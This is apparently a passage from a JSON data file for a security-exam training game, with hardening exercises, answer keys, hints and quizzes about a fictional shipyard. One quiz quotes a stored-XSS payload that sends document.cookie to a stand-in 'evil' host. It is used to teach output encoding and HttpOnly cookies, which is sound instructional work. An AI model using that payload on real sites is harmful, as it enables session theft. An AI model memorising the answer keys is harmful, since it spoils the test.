      "feedback": "Protocol progression matters for the exam: WEP (broken), WPA (stopgap), WPA2 (strong cipher, weak PSKs, deprecated TKIP), WPA3 with 802.1X/RADIUS (AAA-backed). WIDS/WIPS is your wireless detection plane - rogue APs, deauth floods, evil twins - and guest isolation keeps visitors out of the corporate broadcast domain.",
      "hints": [
        "The protocol control is a dropdown, not a switch - open it and read all three options.",
        "Only one protocol option is defensible in 2026.",
        "Both remaining switches on the AP card go ON."
      ]
    },
    {
      "id": "OBJ-M8",
      "pillar": "P4",
      "title": "Secure the customer portal.",
      "anchor": "Secure applications: input validation, secure cookies, static code analysis, header manipulation, code signing, sanitization/output encoding",
      "brief": "APP-PORTAL-01 ships with none of the application bullet’s six techniques enabled. Flip them all - the code review DOC-04 shows what happens if you do not.",
      "location": "Data Vault & App Factory → APP-PORTAL-01.",
      "zone": "appsdata",
      "exercise": {
        "type": "toggles",
        "todo": "Enable all six application controls on APP-PORTAL-01.",
        "required": {
          "APP-PORTAL-01.validation": true,
          "APP-PORTAL-01.encoding": true,
          "APP-PORTAL-01.cookies": true,
          "APP-PORTAL-01.signing": true,
          "APP-PORTAL-01.sast": true,
          "APP-PORTAL-01.headers": true
        }
      },
      "feedback": "Every line of DOC-04 maps to one of these six: unvalidated upload → input validation; cookie without flags → Secure+HttpOnly; innerHTML injection → output encoding/sanitization; unsigned dependency → code signing (and SAST in CI); trusting headers → header checks. Application security is six habits, not one product.",
      "hints": [
        "Open Evidence → DOC-04 and map each bad line to a control label on the portal card.",
        "All six switches on APP-PORTAL-01 go ON.",
        "The cookie line is missing both flags - that is the \"Secure cookies\" control."
      ]
    },
    {
      "id": "OBJ-M9",
      "pillar": "P2",
      "title": "Match each data situation to its protection.",
      "anchor": "Secure data: encryption at rest / in transit / in use, tokenization, data masking, DLP",
      "brief": "Six everyday situations from the yard. Choose the data-protection technique the objective names for each - three of the options will not be used at all.",
      "location": "Matcher below.",
      "exercise": {
        "type": "match",
        "prompt": "Pick the correct protection for each situation.",
        "items": [
          {
            "id": "i1",
            "label": "Backups sitting on a shelf in the office"
          },
          {
            "id": "i2",
            "label": "Portal traffic between customers and the yard"
          },
          {
            "id": "i3",
            "label": "Fraud model crunching live card data in memory"
          },
          {
            "id": "i4",
            "label": "Card numbers replaced by reversible stand-in values"
          },
          {
            "id": "i5",
            "label": "Support screen shows ****-1234 instead of the full number"
          },
          {
            "id": "i6",
            "label": "Bulk export of customer records to a USB stick gets blocked"
          }
        ],
        "options": [
          {
            "id": "o1",
            "label": "Encryption at rest"
          },
          {
            "id": "o2",
            "label": "Encryption in transit"
          },
          {
            "id": "o3",
            "label": "Encryption in use"
          },
          {
            "id": "o4",
            "label": "Tokenization"
          },
          {
            "id": "o5",
            "label": "Data masking"
          },
          {
            "id": "o6",
            "label": "Data Loss Prevention (DLP)"
          },
          {
            "id": "o7",
            "label": "Hashing"
          },
          {
            "id": "o8",
            "label": "Obfuscation"
          }
        ],
        "solution": {
          "i1": "o1",
          "i2": "o2",
          "i3": "o3",
          "i4": "o4",
          "i5": "o5",
          "i6": "o6"
        }
      },
      "feedback": "The three encryption states follow the data: stored (at rest), moving (in transit), being processed (in use). Tokenization substitutes a value; masking hides a value; DLP watches the exits. Hashing is one-way (integrity, not retrieval) and obfuscation only hides meaning - neither protects a retrievable secret.",
      "hints": [
        "Shelf = stored, traffic = moving, memory = processing.",
        "i4 substitutes, i5 hides - different mechanisms: tokenization vs masking.",
        "Hashing and obfuscation are the decoys; neither belongs to any of the six."
      ]
    },
    {
      "id": "OBJ-M10",
      "pillar": "P4",
      "title": "Pick the platform control for each scenario.",
      "anchor": "VDI + Cloud infrastructure (CASB, CSPM, application & storage security); ZTNA/SD-WAN/SASE awareness",
      "brief": "Four scenarios, five candidate controls - one is a decoy that fits none of them.",
      "location": "Matcher below.",
      "exercise": {
        "type": "match",
        "prompt": "Pick the control each scenario calls for.",
        "items": [
          {
            "id": "i1",
            "label": "Marketing bought 12 SaaS apps nobody inventoried"
          },
          {
            "id": "i2",
            "label": "You need an inventory of misconfigurations across cloud accounts"
          },
          {
            "id": "i3",
            "label": "Seasonal contractors should work with apps but zero local data"
          },
          {
            "id": "i4",
            "label": "Remote staff reach internal apps without a traditional VPN"
          }
        ],
        "options": [
          {
            "id": "o1",
            "label": "CASB"
          },
          {
            "id": "o2",
            "label": "CSPM"
          },
          {
            "id": "o3",
            "label": "VDI"
          },
          {
            "id": "o4",
            "label": "ZTNA"
          },
          {
            "id": "o5",
            "label": "SASE"
          }
        ],
        "solution": {
          "i1": "o1",
          "i2": "o2",
          "i3": "o3",
          "i4": "o4"
        }
      },
      "feedback": "CASB discovers and polices SaaS usage (shadow IT); CSPM inventories cloud misconfigurations; VDI keeps data off endpoints; ZTNA brokers per-app access without network-level VPN. SASE is the umbrella architecture combining network + security services - it is the decoy here, not a single control you deploy for one scenario.",
      "hints": [
        "Two cloud controls: one watches SaaS apps, one watches cloud infrastructure.",
        "\"Zero local data\" for contractors is the VDI use case.",
        "ZTNA replaces the VPN pipe with per-application, verified access."
      ]
    },
    {
      "id": "OBJ-M11",
      "pillar": "P3",
      "title": "Triage the baseline audit: which asset burns first?",
      "anchor": "Secure baselines (establish, deploy, maintain) + monitoring; audit-driven detection",
      "brief": "DOC-01 is the Q3 audit excerpt. Read it like a duty officer: exposure, privilege, detectability. Pick the asset that must be fixed first.",
      "location": "Evidence → DOC-01, then answer below.",
      "doc": "DOC-01",
      "exercise": {
        "type": "radio",
        "prompt": "Which asset is the most urgent exposure, and why?",
        "doc": "DOC-01",
        "options": [
          {
            "id": "o1",
            "label": "WS-OPS-01 - unencrypted disk and default admin password"
          },
          {
            "id": "o2",
            "label": "SRV-EXCH-01 - internet-facing, unpatched, no EDR, default credentials"
          },
          {
            "id": "o3",
            "label": "IOT-THRM-07 - default credentials, flat VLAN with payroll"
          },
          {
            "id": "o4",
            "label": "AP-DOCK-01 - WEP radio reaching the street"
          }
        ],
        "solution": "o2"
      },
      "feedback": "SRV-EXCH-01 stacks every risk multiplier: internet-facing (anyone can reach it), unpatched for 14 months (known, weaponized CVEs), no EDR (attacks there are invisible), default credentials (trivial entry). Triage order = reachability × exploitability × blind spots. The others are serious, but none combines all three.",
      "hints": [
        "The auditor scored assets on reachability, privilege and detectability.",
        "Which finding can be attacked by any stranger on the internet, right now, invisibly?",
        "An internet-facing mail server, 14 months unpatched, with no EDR - that is SRV-EXCH-01."
      ]
    },
    {
      "id": "OBJ-M12",
      "pillar": "P2",
      "title": "Reconstruct \"Night Haul\": name the missing control at each stage.",
      "anchor": "Chain position: how each hardening technique would have broken the attack chain",
      "brief": "DOC-02 is the incident timeline. For each of the four named stages, pick the ONE missing technique whose presence would have stopped it.",
      "location": "Evidence → DOC-02, then the matcher below.",
      "doc": "DOC-02",
      "exercise": {
        "type": "match",
        "prompt": "Which missing control let each stage happen?",
        "items": [
          {
            "id": "i1",
            "label": "Stage 1 - core switch login with vendor default password"
          },
          {
            "id": "i2",
            "label": "Stage 2 - crane PLC reached the CRM database directly"
          },
          {
            "id": "i3",
            "label": "Stage 3 - arbitrary trojan file uploaded through the portal"
          },
          {
            "id": "i4",
            "label": "Stage 5 - stolen laptop with readable client contracts"
          }
        ],
        "options": [
          {
            "id": "o1",
            "label": "Change default/common passwords"
          },
          {
            "id": "o2",
            "label": "VLAN segmentation"
          },
          {
            "id": "o3",
            "label": "Input validation"
          },
          {
            "id": "o4",
            "label": "Full-disk encryption"
          }
        ],
        "solution": {
          "i1": "o1",
          "i2": "o2",
          "i3": "o3",
          "i4": "o4"
        }
      },
      "feedback": "This is the objective’s core mental model: every hardening technique exists to break a specific link in an attack chain. Default credentials opened the door, missing segmentation removed the walls, missing validation accepted the weapon, missing encryption lost the crown jewels. Read any incident this way and the objective stops being a list.",
      "hints": [
        "Each stage phrase names its own failure: \"default password\", \"reached directly\", \"uploaded\", \"readable\".",
        "Stage 2 is about network architecture, not credentials.",
        "Stage 5 is a data-at-rest failure on a stolen device."
      ]
    }
  ],
  "HARD_OBJECTIVES": [
    {
      "id": "OBJ-H1",
      "pillar": "P4",
      "title": "Build the full hardening matrix across six assets - exact states, no spare moves.",
      "anchor": "Endpoint methods, mobile controls incl. geotagging OFF, wireless protocol, application suite, data suite",
      "brief": "Work orders sometimes demand exact end-states, not \"more green\". Deliver the matrix below across WS-OPS-01, SRV-FILE-01, ICS-CRANE-01, PH-DRV-14, AP-DOCK-01 and DB-CRM-01. Two traps are built in: one control must end OFF, and one is a protocol dropdown.",
      "location": "Hidden - read the matrix.",
      "zone": "endpoints",
      "exercise": {
        "type": "toggles",
        "todo": "Deliver every state in the matrix. Partial matrices are rejected.",
        "required": {
          "WS-OPS-01.smbv1": true,
          "WS-OPS-01.creds": true,
          "WS-OPS-01.fde": true,
          "WS-OPS-01.hfw": true,
          "WS-OPS-01.edr": true,
          "WS-OPS-01.patch": true,
          "SRV-FILE-01.services": true,
          "SRV-FILE-01.creds": true,
          "SRV-FILE-01.hips": true,
          "SRV-FILE-01.baseline": true,
          "SRV-FILE-01.integrity": true,
          "ICS-CRANE-01.segment": true,
          "ICS-CRANE-01.phys": true,
          "ICS-CRANE-01.creds": true,
          "ICS-CRANE-01.patch": true,
          "PH-DRV-14.mdm": true,
          "PH-DRV-14.container": true,
          "PH-DRV-14.lock": true,
          "PH-DRV-14.wipe": true,
          "PH-DRV-14.enc": true,
          "PH-DRV-14.geotag": false,
          "AP-DOCK-01.proto": "wpa3",
          "AP-DOCK-01.wids": true,
          "AP-DOCK-01.guestiso": true,
          "DB-CRM-01.encRest": true,
          "DB-CRM-01.encTransit": true,
          "DB-CRM-01.token": true,
          "DB-CRM-01.mask": true,
          "DB-CRM-01.dlp": true,
          "DB-CRM-01.keys": true
        }
      },
      "feedback": "30 states, delivered exactly. The two traps: geotagging on the BYOD phone must be OFF (location tags leak routes and home addresses - hardening sometimes means turning things off), and the AP protocol is a choice, not a switch. A matrix mindset - asset × control × required state - is how real baselines are deployed and audited.",
      "hints": [
        "Not every cell is ON. Read every label; one control’s hardened state is OFF.",
        "The AP protocol row is a dropdown - WPA3 + 802.1X/RADIUS is the only acceptable value.",
        "PH-DRV-14: everything ON except location tagging (geotagging)."
      ]
    },
    {
      "id": "OBJ-H2",
      "pillar": "P3",
      "title": "Wireless forensics: pin down four facts from the config dump.",
      "anchor": "WEP/WPA/WPA2-TKIP/WPA3, WIDS/WIPS, guest isolation, handshake cracking",
      "brief": "DOC-03 is the AP config dump plus a wardriver’s capture note. Answer all four items with exact readings - near-misses are rejected.",
      "location": "Evidence → DOC-03.",
      "doc": "DOC-03",
      "exercise": {
        "type": "match",
        "prompt": "Read DOC-03 and pick the exact finding for each item.",
        "items": [
          {
            "id": "i1",
            "label": "Which deprecated encryption suite protects NWF-DOCK?"
          },
          {
            "id": "i2",
            "label": "Which SSID accepts unauthenticated association with no isolation?"
          },
          {
            "id": "i3",
            "label": "Which attack does the captured handshake material enable?"
          },
          {
            "id": "i4",
            "label": "Which replacement closes both the cipher and the PSK weakness?"
          }
        ],
        "options": [
          {
            "id": "o1",
            "label": "WPA2 with TKIP"
          },
          {
            "id": "o2",
            "label": "NWF-GUEST"
          },
          {
            "id": "o3",
            "label": "Offline dictionary attack against the pre-shared key"
          },
          {
            "id": "o4",
            "label": "WPA3 with 802.1X/RADIUS plus WIDS/WIPS monitoring"
          },
          {
            "id": "o5",
            "label": "WEP 40/104-bit"
          },
          {
            "id": "o6",
            "label": "Live man-in-the-middle injection"
          }
        ],
        "solution": {
          "i1": "o1",
          "i2": "o2",
          "i3": "o3",
          "i4": "o4"
        }
      },
      "feedback": "The config tells the truth most audits miss: \"encryption mode ciphers tkip\" means WPA2 running a deprecated cipher (TKIP), not the WPA2-CCMP people assume. The capture note converts cipher weakness into attack feasibility: captured 4-way handshakes feed offline dictionary attacks against PSKs. The fix is WPA3 + 802.1X/RADIUS (per-user credentials, no shared PSK to crack) plus WIDS/WIPS so the next wardriver trips an alarm.",
      "hints": [
        "\"ciphers tkip\" in the config is the suite being asked for in i1 - not WEP.",
        "The SSID with \"authentication open\" AND \"no isolation\" is the answer to i2.",
        "The capture note names the attack verbatim - read it again."
      ]
    },
    {
      "id": "OBJ-H3",
      "pillar": "P4",
      "title": "Design the data-protection blueprint: five classes, exact controls.",
      "anchor": "Secure data: encryption at rest / in transit / in use, tokenization, masking (+ decoys: hashing, obfuscation)",
      "brief": "The CRM holds five distinct data situations. Choose the one correct control per class - two decoy options must go unused. Wrong picks are rejected with the reason.",
      "location": "Matcher below.",
      "exercise": {
        "type": "match",
        "prompt": "Assign the one correct control to each data class.",
        "items": [
          {
            "id": "i1",
            "label": "Card numbers stored for billing"
          },
          {
            "id": "i2",
            "label": "Support screen displaying customer SSNs"
          },
          {
            "id": "i3",
            "label": "Nightly database backups on cold storage"
          },
          {
            "id": "i4",
            "label": "Booking traffic from browsers to the portal"
          },
          {
            "id": "i5",
            "label": "Real-time fraud scoring over live card data in memory"
          }
        ],
        "options": [
          {
            "id": "o1",
            "label": "Tokenization"
          },
          {
            "id": "o2",
            "label": "Data masking"
          },
          {
            "id": "o3",
            "label": "Encryption at rest"
          },
          {
            "id": "o4",
            "label": "Encryption in transit"
          },
          {
            "id": "o5",
            "label": "Encryption in use"
          },
          {
            "id": "o6",
            "label": "Hashing"
          },
          {
            "id": "o7",
            "label": "Obfuscation"
          }
        ],
        "solution": {
          "i1": "o1",
          "i2": "o2",
          "i3": "o3",
          "i4": "o4",
          "i5": "o5"
        }
      },
      "feedback": "Stored card numbers are tokenized - the real value leaves the database entirely. Support screens get masking (display-layer hiding, value unchanged underneath). Backups are data at rest; browser traffic is data in transit; live in-memory scoring is data in use. Hashing is one-way and cannot return a card number or an SSN; obfuscation hides meaning but is not cryptographically binding - neither survives an audit.",
      "hints": [
        "i1 asks for the control that REMOVES the real value from the database - substitution, not encryption.",
        "i2 is display-layer only; the stored value stays intact.",
        "Hashing and obfuscation are the two decoys - both fail the \"recoverable when needed\" test."
      ]
    },
    {
      "id": "OBJ-H4",
      "pillar": "P2",
      "title": "Code review: classify all five flaws in APP-PORTAL-01.",
      "anchor": "Secure applications: input validation, secure cookies, output encoding/sanitization, code signing, header/information handling",
      "brief": "DOC-04 lists five flagged lines. Map every line to its flaw class. Two decoy classes exist in the option list.",
      "location": "Evidence → DOC-04.",
      "doc": "DOC-04",
      "exercise": {
        "type": "match",
        "prompt": "Classify each flagged line.",
        "items": [
          {
            "id": "i1",
            "label": "L41 - upload accepted without filename/type/size checks"
          },
          {
            "id": "i2",
            "label": "L52 - session cookie set without flags"
          },
          {
            "id": "i3",
            "label": "L60 - user comment rendered as raw HTML"
          },
          {
            "id": "i4",
            "label": "L70 - dependency pinned by tag, unsigned, unknown publisher"
          },
          {
            "id": "i5",
            "label": "L77 - full stack trace returned to the client"
          }
        ],
        "options": [
          {
            "id": "o1",
            "label": "Missing input validation"
          },
          {
            "id": "o2",
            "label": "Cookie missing Secure/HttpOnly"
          },
          {
            "id": "o3",
            "label": "Missing output encoding/sanitization"
          },
          {
            "id": "o4",
            "label": "Unsigned, unverified code dependency"
          },
          {
            "id": "o5",
            "label": "Information disclosure in error handling"
          },
          {
            "id": "o6",
            "label": "Missing transport encryption (no TLS)"
          },
          {
            "id": "o7",
            "label": "Weak session timeout policy"
          }
        ],
        "solution": {
          "i1": "o1",
          "i2": "o2",
          "i3": "o3",
          "i4": "o4",
          "i5": "o5"
        }
      },
      "feedback": "Five flaws, five technique bullets: the upload needs server-side input validation (type, length, range, format); the cookie needs Secure+HttpOnly; innerHTML of user content is the textbook missing output encoding; the dependency needs code signing / verified provenance with SAST in CI; the stack trace is information disclosure - errors must be logged server-side, not served. The two decoys (no TLS, session timeout) are real vulnerability classes but not what these lines show.",
      "hints": [
        "Four of the five map 1:1 to controls on the APP-PORTAL-01 card.",
        "L77 leaks internals to the client - it is an information-handling flaw, not a crypto one.",
        "TLS and session timeout are the decoys; nothing in DOC-04 shows either."
      ]
    },
    {
      "id": "OBJ-H5",
      "pillar": "P1",
      "title": "Incident chain reconstruction: five stages, five missing defensive layers.",
      "anchor": "Chain position: default credentials, OT segmentation, input validation, DLP, full-disk encryption",
      "brief": "The full DOC-02 timeline has five stages. For each, name the missing layer - and understand WHERE in the chain it acts: entry, movement, staging, exfiltration, loss.",
      "location": "Evidence → DOC-02.",
      "doc": "DOC-02",
      "exercise": {
        "type": "match",
        "prompt": "Which missing defensive layer does each stage exploit?",
        "items": [
          {
            "id": "i1",
            "label": "Stage 1 - core switch management login"
          },
          {
            "id": "i2",
            "label": "Stage 2 - PLC reaching the CRM database"
          },
          {
            "id": "i3",
            "label": "Stage 3 - trojan upload through the portal"
          },
          {
            "id": "i4",
            "label": "Stage 4 - bulk export of 212k records"
          },
          {
            "id": "i5",
            "label": "Stage 5 - laptop stolen from the truck cab"
          }
        ],
        "options": [
          {
            "id": "o1",
            "label": "Change default credentials"
          },
          {
            "id": "o2",
            "label": "OT network segmentation"
          },
          {
            "id": "o3",
            "label": "Input validation"
          },
          {
            "id": "o4",
            "label": "DLP egress rules"
          },
          {
            "id": "o5",
            "label": "Full-disk encryption"
          }
        ],
        "solution": {
          "i1": "o1",
          "i2": "o2",
          "i3": "o3",
          "i4": "o4",
          "i5": "o5"
        }
      },
      "feedback": "Now you can read a chain by its layers: credentials (entry), segmentation (movement), validation (weapon staging), DLP (exfiltration), encryption at rest (loss). Five different techniques, five different chain positions - and the objective’s bullets are exactly this map. On the exam, \"which control would have prevented...\" questions resolve by locating the stage first, then the technique for that stage.",
      "hints": [
        "Order the stages by chain position: entry → lateral movement → staging → exfiltration → physical loss.",
        "Stage 4 is data LEAVING in bulk - that is a specific data control, not encryption.",
        "Stage 5 never involves the network at all."
      ]
    },
    {
      "id": "OBJ-H6",
      "pillar": "P4",
      "title": "Segmentation surgery: place six assets in the right zone.",
      "anchor": "Network segmentation: VLANs, screened subnet, guest/OT separation",
      "brief": "Redesign the flat network. Assign each asset to its zone. One option is a decoy. Constraint check: public services in the screened subnet, OT and IoT out of the corporate VLAN, guests caged, crown-jewel database behind corporate controls.",
      "location": "Matcher below.",
      "exercise": {
        "type": "match",
        "prompt": "Assign each asset to its network zone.",
        "items": [
          {
            "id": "i1",
            "label": "APP-PORTAL-01 (public booking portal)"
          },
          {
            "id": "i2",
            "label": "DB-CRM-01 (customer database, PII + cards)"
          },
          {
            "id": "i3",
            "label": "WS-OPS-01 (dispatch workstation)"
          },
          {
            "id": "i4",
            "label": "ICS-CRANE-01 (crane PLC)"
          },
          {
            "id": "i5",
            "label": "IOT-THRM-07 (HVAC IoT sensor)"
          },
          {
            "id": "i6",
            "label": "Visitors on the guest SSID"
          }
        ],
        "options": [
          {
            "id": "o1",
            "label": "Corporate VLAN"
          },
          {
            "id": "o2",
            "label": "Guest VLAN"
          },
          {
            "id": "o3",
            "label": "Screened subnet (DMZ)"
          },
          {
            "id": "o4",
            "label": "OT/IoT VLAN"
          },
          {
            "id": "o5",
            "label": "Flat layer-2 (VLAN 1)"
          }
        ],
        "solution": {
          "i1": "o3",
          "i2": "o1",
          "i3": "o1",
          "i4": "o4",
          "i5": "o4",
          "i6": "o2"
        }
      },
      "feedback": "The public portal sits in the screened subnet where it can be attacked without reaching anything else. The database and dispatch workstation share the corporate VLAN behind authentication. Crane and HVAC sensor share the OT/IoT VLAN (both are limited-capability devices with their own broker/SCADA traffic). Guests are caged. \"Flat layer-2\" is the decoy - it is precisely the architecture that failed in Night Haul.",
      "hints": [
        "Internet-reachable service goes in the zone between two firewall legs.",
        "PLC and IoT sensor are BOTH limited-purpose OT devices - same zone.",
        "One option is the architecture you are paid to eliminate."
      ]
    },
    {
      "id": "OBJ-H7",
      "pillar": "P2",
      "title": "Three deployment-model calls - justify by ownership and control.",
      "anchor": "Mobile deployment models: BYOD, COPE, CYOD",
      "brief": "Three real requests from the depot. Choose the model whose ownership and control profile matches exactly - the near-misses are genuinely close.",
      "location": "Matcher below.",
      "exercise": {
        "type": "match",
        "prompt": "Pick the deployment model for each request.",
        "items": [
          {
            "id": "i1",
            "label": "Field consultants refuse a second phone; company needs only the mail+manifest apps managed"
          },
          {
            "id": "i2",
            "label": "Warehouse scanners are bought, owned and fully controlled by the yard, with limited personal use allowed"
          },
          {
            "id": "i3",
            "label": "Drivers pick a device from the approved catalogue; the yard buys it and controls it fully, no personal use"
          }
        ],
        "options": [
          {
            "id": "o1",
            "label": "BYOD"
          },
          {
            "id": "o2",
            "label": "COPE"
          },
          {
            "id": "o3",
            "label": "CYOD"
          },
          {
            "id": "o4",
            "label": "No management (air-gap by policy)"
          }
        ],
        "solution": {
          "i1": "o1",
          "i2": "o2",
          "i3": "o3"
        }
      },
      "feedback": "Ownership decides everything: BYOD = user owns, company manages only a container (a full-device wipe is not available). COPE = company owns, personal use enabled (full control, morale cost of \"corporate device at home\"). CYOD = company owns, user chooses the model, no personal use. The trap in i2 vs i3: \"limited personal use\" is the E in COPE; its absence makes it CYOD.",
      "hints": [
        "Who owns the device, and is personal use allowed? Those two questions generate all answers.",
        "\"Refuse a second phone\" means the device is the employee’s - only a container is manageable.",
        "Catalogue choice + zero personal use = choose-your-own, still corporate."
      ]
    },
    {
      "id": "OBJ-H8",
      "pillar": "P3",
      "title": "CSPM triage: which findings are real risks?",
      "anchor": "Cloud infrastructure: CSPM, storage security, EDR, identity hardening",
      "brief": "DOC-05 is the first CSPM scan: six findings, four are real risks, two are red herrings that must NOT be escalated. Select exactly the four.",
      "location": "Evidence → DOC-05.",
      "doc": "DOC-05",
      "exercise": {
        "type": "multi",
        "prompt": "Select the four findings that are real, actionable risks.",
        "doc": "DOC-05",
        "options": [
          {
            "id": "f1",
            "label": "F-1  Public bucket with PII dumps"
          },
          {
            "id": "f2",
            "label": "F-2  VM without EDR agent"
          },
          {
            "id": "f3",
            "label": "F-3  Admin account without MFA"
          },
          {
            "id": "f4",
            "label": "F-4  TLS 1.0 accepted on storage"
          },
          {
            "id": "f5",
            "label": "F-5  Approved dev naming convention"
          },
          {
            "id": "f6",
            "label": "F-6  $0.02 cost anomaly"
          }
        ],
        "solution": [
          "f1",
          "f2",
          "f3",
          "f4"
        ]
      },
      "feedback": "F-1 (public PII storage), F-2 (blind spot: no EDR), F-3 (privileged identity without MFA) and F-4 (deprecated protocol accepted) are all concrete, exploitable posture gaps. F-5 is compliance-with-a-convention, not a risk; F-6 is a two-cent rounding artifact. Triage discipline: a scanner’s job is to list, YOUR job is to rank - escalating noise is how real alerts get ignored.",
      "hints": [
        "Ask of each finding: can an attacker DO something with this today?",
        "One red herring is a naming convention; the other is a rounding error.",
        "Exactly four: two storage/protocol/identity/agent gaps... count them."
      ]
    },
    {
      "id": "OBJ-H9",
      "pillar": "P4",
      "title": "Sequence the hardening rollout for the whole yard.",
      "anchor": "Secure baselines: establish → deploy → maintain; patching; EDR; monitoring/validation; documentation",
      "brief": "Six rollout steps arrive shuffled. Restore the correct order - baseline thinking from \"establish, deploy, maintain\".",
      "location": "Sequencer below.",
      "exercise": {
        "type": "sequence",
        "prompt": "Order the rollout from first to last.",
        "items": [
          {
            "id": "s1",
            "label": "Document the approved secure baseline (build sheet per asset class)"
          },
          {
            "id": "s2",
            "label": "Inventory assets and prioritize internet-facing ones"
          },
          {
            "id": "s3",
            "label": "Apply patches in scheduled maintenance windows, internet-facing first"
          },
          {
            "id": "s4",
            "label": "Deploy EDR and host-based IPS across the fleet"
          },
          {
            "id": "s5",
            "label": "Enable monitoring and validate fleet state against the baseline"
          },
          {
            "id": "s6",
            "label": "Schedule recurring drift review and baseline maintenance"
          }
        ],
        "solution": [
          "s1",
          "s2",
          "s3",
          "s4",
          "s5",
          "s6"
        ]
      },
      "feedback": "Baseline logic is a lifecycle: ESTABLISH the documented baseline first (you cannot measure drift without it), know and prioritize your assets, patch the exposed ones on a controlled window, add behavioral defenses, DEPLOY monitoring and VALIDATE against the baseline, then MAINTAIN on a schedule. Patching before a baseline exists is how \"temporary exceptions\" become permanent.",
      "hints": [
        "The objective bullet is \"establish, deploy, maintain\" - three phases, six steps.",
        "You cannot validate against a baseline you have not documented - documentation comes first.",
        "Monitoring/validation precedes the recurring maintenance cadence."
      ]
    }
  ],
  "QUIZZES": {
    "medium": [
      {
        "id": "Q-M1",
        "q": "A field laptop is stolen from a yard truck. Which control most directly protects the data on its disk?",
        "options": [
          {
            "id": "a",
            "label": "Host-based firewall"
          },
          {
            "id": "b",
            "label": "DNS filtering"
          },
          {
            "id": "c",
            "label": "Full-disk encryption"
          },
          {
            "id": "d",
            "label": "Input validation"
          }
        ],
        "answer": "c",
        "explain": "Full-disk encryption protects data at rest. Without it, an attacker removes the drive and reads it on their own machine - no OS password required. The firewall and DNS filtering only matter when the device is running and connected."
      },
      {
        "id": "Q-M2",
        "q": "What is the purpose of a screened subnet (DMZ)?",
        "options": [
          {
            "id": "a",
            "label": "Hosts public services apart from internal systems"
          },
          {
            "id": "b",
            "label": "Speeds up traffic between internal network zones"
          },
          {
            "id": "c",
            "label": "Encrypts wireless handshakes at access points"
          },
          {
            "id": "d",
            "label": "Applies mobile device policy to phones"
          }
        ],
        "answer": "a",
        "explain": "A screened subnet sits between two firewall legs. Public services live there so a compromise of the portal cannot pivot directly into corporate VLANs - it is segmentation applied to the perimeter."
      },
      {
        "id": "Q-M3",
        "q": "Which statement about Wi-Fi protocols is correct?",
        "options": [
          {
            "id": "a",
            "label": "WEP and WPA3 offer equal protection"
          },
          {
            "id": "b",
            "label": "WPA3 with 802.1X replaces WEP and TKIP"
          },
          {
            "id": "c",
            "label": "WPA2 with TKIP is the recommended standard"
          },
          {
            "id": "d",
            "label": "WIDS/WIPS replaces the need for encryption"
          }
        ],
        "answer": "b",
        "explain": "WEP is broken and TKIP is deprecated. WPA3 with 802.1X against a RADIUS (AAA) server gives per-user credentials and modern cryptography. WIDS/WIPS detects wireless attacks - it complements encryption, it does not replace it."
      },
      {
        "id": "Q-M4",
        "q": "The billing database stores card numbers as unrelated stand-in values; the real numbers sit in a separate vault. Which technique is this?",
        "options": [
          {
            "id": "a",
            "label": "Data masking"
          },
          {
            "id": "b",
            "label": "Hashing"
          },
          {
            "id": "c",
            "label": "Obfuscation"
          },
          {
            "id": "d",
            "label": "Tokenization"
          }
        ],
        "answer": "d",
        "explain": "Tokenization substitutes a real value with a token and keeps the mapping in a separate vault, so the database itself holds nothing valuable. Masking only hides at the display layer; hashing is one-way; obfuscation is not cryptographically binding."
      },
      {
        "id": "Q-M5",
        "q": "Marketing has signed the company up for dozens of SaaS apps that IT never inventoried. Which control addresses this?",
        "options": [
          {
            "id": "a",
            "label": "CASB"
          },
          {
            "id": "b",
            "label": "CSPM"
          },
          {
            "id": "c",
            "label": "VDI"
          },
          {
            "id": "d",
            "label": "Host-based IPS"
          }
        ],
        "answer": "a",
        "explain": "A Cloud Access Security Broker discovers shadow SaaS usage and enforces policy on it. CSPM scans cloud infrastructure misconfigurations - a different layer. VDI is about desktops, not SaaS discovery."
      },
      {
        "id": "Q-M6",
        "q": "What does \"maintain a secure baseline\" mean in practice?",
        "options": [
          {
            "id": "a",
            "label": "Install antivirus once and never revisit settings"
          },
          {
            "id": "b",
            "label": "Reset every device to factory defaults monthly"
          },
          {
            "id": "c",
            "label": "Document the approved state, deploy it, correct drift"
          },
          {
            "id": "d",
            "label": "Buy all equipment from a single approved vendor"
          }
        ],
        "answer": "c",
        "explain": "A baseline is a documented, approved state: establish it, deploy it, and maintain it by measuring drift (configuration monitoring) and correcting it. \"Set and forget\" is the opposite of maintain."
      }
    ],
    "hard": [
      {
        "id": "Q-H1",
        "q": "A warehouse tablet (COPE) is reported lost during a delivery run. Which capability lets you erase the corporate data while the tablet is off-network?",
        "options": [
          {
            "id": "a",
            "label": "A geofencing policy on the device"
          },
          {
            "id": "b",
            "label": "Application allow list enforced by MDM"
          },
          {
            "id": "c",
            "label": "Six-digit screen lock with timeout"
          },
          {
            "id": "d",
            "label": "MDM remote wipe on next connection"
          }
        ],
        "answer": "d",
        "explain": "Remote wipe is issued from the MDM console and executes when the device next reaches the network - which is why full-device encryption matters in parallel: it protects the data until the wipe lands. Geofencing detects the departure; the allow list governs apps; the lock screen is only a first gate."
      },
      {
        "id": "Q-H2",
        "q": "Night Haul stage 2: the crane PLC could reach the CRM database directly. Which single control would have broken that link?",
        "options": [
          {
            "id": "a",
            "label": "EDR installed on the PLC itself"
          },
          {
            "id": "b",
            "label": "OT/IoT network segmentation"
          },
          {
            "id": "c",
            "label": "DNS filtering"
          },
          {
            "id": "d",
            "label": "Full-disk encryption on the database"
          }
        ],
        "answer": "b",
        "explain": "The stage failed because OT and corporate shared a flat network. Segmentation (VLANs/zones) is the control that bounds where a compromised OT device can reach. EDR is rarely deployable on PLCs; DNS filtering does not govern internal east-west traffic; encryption at rest does not stop a live connection."
      },
      {
        "id": "Q-H3",
        "q": "The portal renders user comments directly into the page. A user posts \"<script>fetch('//evil?t='+document.cookie)</script>\" and session cookies of other users start leaking. Which combination fixes it?",
        "options": [
          {
            "id": "a",
            "label": "Output-encode rendered comments; set Secure, HttpOnly cookies"
          },
          {
            "id": "b",
            "label": "Input validation on the login form"
          },
          {
            "id": "c",
            "label": "Code signing of every portal production build"
          },
          {
            "id": "d",
            "label": "DLP rules watching database exports"
          }
        ],
        "answer": "a",
        "explain": "This is stored XSS: unencoded output lets posted content execute as script, and readable cookies make the session the payload. Output encoding neutralizes the injection; HttpOnly blocks script from reading the cookie; Secure forces HTTPS transport. Validation alone would not catch every encoding bypass - defense in depth pairs them."
      },
      {
        "id": "Q-H4",
        "q": "An IoT HVAC sensor cannot run agents and cannot be patched for six months. Which control set best reduces its risk?",
        "options": [
          {
            "id": "a",
